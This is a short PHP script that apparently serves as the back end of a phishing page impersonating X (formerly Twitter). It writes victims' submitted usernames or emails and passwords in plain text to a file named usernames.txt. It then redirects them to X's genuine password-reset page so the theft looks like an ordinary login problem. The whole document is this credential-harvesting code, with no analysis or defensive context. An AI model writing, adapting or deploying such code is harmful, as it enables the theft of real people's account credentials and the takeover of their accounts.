<?php

file_put_contents("usernames.txt", "X Username: " . $_POST['usernameOrEmail'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://x.com/account/begin_password_reset');
exit();
?>